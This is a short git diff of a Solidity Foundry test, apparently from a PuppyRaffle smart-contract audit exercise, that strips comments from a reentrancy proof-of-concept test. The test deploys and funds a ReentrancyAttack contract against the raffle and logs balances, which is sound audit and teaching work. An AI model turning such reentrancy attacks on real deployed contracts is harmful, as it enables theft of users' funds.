@@ -252,7 +252,6 @@ contract PuppyRaffleTest is Test {
 
     //reentrancy 
     function test_ReentrancyAttack() public {
-    // create players up-front so refund logic exists
      address[] memory players = new address[](4);
         players[0] = playerOne;
         players[1] = playerTwo;
@@ -260,16 +259,13 @@ contract PuppyRaffleTest is Test {
         players[3] = playerFour;
         puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
         
-    // deploy attacker
     ReentrancyAttack attacker = new ReentrancyAttack(address(puppyRaffle));
 
-    // fund attacker
     vm.deal(address(attacker), 1 ether);
 
     uint256 startingBalance = address(puppyRaffle).balance;
     uint256 attackerBalanceBefore = address(attacker).balance;
 
-    // trigger exploit
     attacker.attack{value: entranceFee}();
 
     console.log("PuppyRaffle balance before attack:", startingBalance);
